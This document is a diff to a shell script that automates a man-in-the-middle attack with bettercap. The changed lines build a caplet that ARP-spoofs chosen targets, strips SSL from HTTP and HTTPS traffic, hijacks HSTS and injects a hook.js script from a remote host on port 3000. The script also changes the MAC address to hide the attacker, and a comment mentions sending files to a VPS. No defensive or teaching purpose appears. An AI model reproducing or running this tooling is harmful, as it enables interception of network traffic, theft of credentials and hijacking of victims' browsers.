@@ -43,26 +43,11 @@ done
 macchanger -s $adapter_used
 }
 
-install_bettercap() {
-# Check if bettercap is installed
-if command -v bettercap &> /dev/null; then
-    echo "bettercap is already installed."
-else
-    # Install bettercap
-    echo "Installing bettercap..."
-    sudo apt-get update
-    sudo apt-get install -y bettercap
-    echo "bettercap has been installed."
-
-fi
-}
 #macchanging
 
 start() {
     #CHANGING MAC-ADDRESS
   #macchanging
-  install_bettercap
-
 
   wget -q --spider http://google.com
 
@@ -99,12 +84,12 @@ start() {
   #sudo rm -rfv /usr/local/share/bettercap/caplets/hstshijack
   #sudo cp -rfv hstshijack /usr/local/share/bettercap/caplets
 
-
   #send old files to VPS
+  
 
 
   current_dir=$(pwd)
-  echo -e $"net.probe on\nset http.proxy.sslstrip true\nset http.proxy.inject.js $d:3000/hook.js\nhttp.proxy on\nset arp.spoof.fullduplex true \nset arp.spoof.targets $b \narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > spoof.cap
+  echo -e $"net.probe on\nset http.proxy.sslstrip true\nset https.proxy.sslstrip true\nset http.proxy.inject.js $d:3000/hook.js\nhttp.proxy on\nset arp.spoof.fullduplex true \nset arp.spoof.targets $b \narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > spoof.cap
   rm -rf finished.txt
 
   wifi_name=$(iwgetid -r)
